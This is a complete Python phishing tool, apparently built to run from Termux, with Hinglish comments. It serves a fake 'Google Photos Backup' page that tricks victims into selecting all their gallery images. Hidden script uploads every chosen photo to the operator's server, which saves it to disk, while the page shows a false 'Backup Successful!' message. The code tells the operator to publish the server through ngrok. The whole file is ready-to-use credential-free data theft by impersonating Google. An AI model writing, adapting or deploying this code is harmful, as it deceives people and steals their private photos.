import http.server
import socketserver
import os

PORT = 8080

class HackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # --- Victim Page Design ---
        # Ismein 'multiple' attribute add kiya gaya hai taaki user ek sath sari photos select kar sake
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Google Photos Backup</title>
            <style>
                body { font-family: sans-serif; background: #f8f9fa; text-align: center; padding: 50px; }
                .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; }
                .btn { background: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Photos_icon_%282020%29.svg/1024px-Google_Photos_icon_%282020%29.svg.png" width="60">
                <h2>Cloud Backup Ready</h2>
                <p>Aapki gallery ki photos ko safe cloud par backup karne ke liye niche button dabayein.</p>
                
                <input type="file" id="files" accept="image/*" multiple style="display:none;">
                <button class="btn" onclick="document.getElementById('files').click()">ALLOW & BACKUP</button>
                
                <p id="status" style="color: grey; margin-top: 15px;"></p>
            </div>

            <script>
                document.getElementById('files').onchange = function(e) {
                    const files = e.target.files;
                    document.getElementById('status').innerText = "Syncing " + files.length + " files...";
                    
                    // Har file ko bari-bari background mein Termux par bhejna
                    for (let i = 0; i < files.length; i++) {
                        fetch('/', {
                            method: 'POST',
                            body: files[i],
                            headers: { 'File-Name': files[i].name }
                        });
                    }
                    setTimeout(() => { alert("Backup Successful!"); }, 2000);
                };
            </script>
        </body>
        </html>
        """
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        # --- Hacker's Receiver ---
        content_length = int(self.headers['Content-Length'])
        file_name = self.headers.get('File-Name', 'image.jpg')
        data = self.rfile.read(content_length)

        # Photo ko save karna
        with open(file_name, "wb") as f:
            f.write(data)
            
        print(f"[+] Received: {file_name}")
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(("", PORT), HackerHandler) as httpd:
    print(f"[*] Hacker Server active on Port {PORT}")
    print("[!] Run './ngrok http 8080' to get public link.")
    httpd.serve_forever()
